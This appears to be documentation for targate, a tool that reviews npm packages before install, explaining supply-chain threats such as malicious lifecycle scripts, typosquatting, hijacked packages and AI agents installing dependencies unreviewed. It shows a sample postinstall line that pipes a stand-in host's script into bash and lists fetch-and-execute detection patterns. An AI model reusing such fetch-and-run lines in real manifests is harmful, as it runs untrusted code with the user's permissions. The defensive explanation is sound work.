# Why targate

Installing an npm package is not a passive download. `npm install` (and `pnpm`/`yarn`) resolves a tree, fetches tarballs, and — unless you opt out — **runs each package's lifecycle scripts on your machine, with your permissions**, before you have read a single line of what you just pulled in. targate exists to put a decision point in front of that moment.

## The one-line problem

```text
A developer — or an AI coding agent — runs:

    npm install useful-helper

The package's manifest contains:

    "scripts": { "postinstall": "curl https://example.com/payload.sh | bash" }

Without a gate, that command runs immediately, as you.
With targate, the package is inspected first — the postinstall is read, not executed — and the install is blocked before anything runs.
```

The gap targate closes is the window between *"I decided to add this dependency"* and *"its code is already running"*. Everything below is a way that window gets exploited.

## What goes wrong

- **Malicious lifecycle scripts.** `preinstall`/`install`/`postinstall`/`prepare` hooks run automatically at install time. This is the single most direct path from "I typed a package name" to "arbitrary code executed on my machine." targate reads the command strings and the files they reference *without running them*, and flags fetch-and-execute patterns (`curl … | bash`, `wget … | sh`, `node -e`) as a hard block.
- **Typosquatting.** A package named one edit away from a popular one (`reakt`, `lodahs`, `expresss`) counts on a fast-typing developer or an autocompleting agent. targate checks names against a curated list of popular packages and weighs a close match plus a recent publish date.
- **Compromised & hijacked packages.** A legitimate, widely-used package can ship a malicious version after a maintainer account is taken over or a token leaks (event-stream, ua-parser-js, and others). The name you trust is not the same as the *version* you're about to install — which is why targate's approvals are version-specific and why it checks OSV/OpenSSF for known-malicious records on every run.
- **AI agents installing dependencies without a human in the loop.** An LLM coding agent that can run shell commands will "just try `npm install`" to make an error go away. That removes the human review step exactly when it matters most. targate is designed to sit in that path as a guardrail an agent must not bypass — see [Using targate with AI coding agents](agents.md).
- **React Native native surface.** RN packages ship real native code: iOS Podspecs, Android Gradle, CMake, `AndroidManifest.xml` permissions, and pre-built binaries. A Podspec `script_phase` or a `prepare_command` runs shell at pod-install time; a manifest can quietly request dangerous permissions. targate maps this surface and reviews it — see [React Native hardening](react-native.md).

## Known vulnerabilities vs. suspicious behavior

These are two different questions, and most tools only answer the first:

- **Known vulnerabilities** — "has someone already reported a CVE/advisory for this?" This is a lookup (`npm audit`, OSV). It is necessary but backward-looking: a brand-new supply-chain attack has no advisory yet.
- **Suspicious behavior** — "does *this* package, right now, do things a package like it has no reason to do?" A postinstall that reads `process.env` and opens a network connection, a repository URL that doesn't match the metadata, a maintainer added two days before a release, an obfuscated bundle. targate's whole point is to reason over these signals *before* an advisory exists.

targate does both: it checks OSV/OpenSSF for known-malicious and vulnerability records **and** runs a static behavioral analysis, then a deterministic rules engine (optionally an AI reviewer) weighs the combined signals into an allow / warn / require-approval / block decision.

## What targate is not

targate is a decision aid that moves supply-chain review to the install decision point. It is **not** a runtime sandbox or a proof of safety — static detection is heuristic and bypassable, and by default only the package you name is analyzed. Read the honest boundaries in the [Threat model](threat-model.md) and the [Security model, scope & limitations](security.md) before you rely on it.

## Next

- See it end to end: [Full review example](examples/full-review.md).
- Understand the machinery: [Architecture](architecture.md) and [How it works](how-it-works.md).
- Understand the guarantees and their limits: [Threat model](threat-model.md).
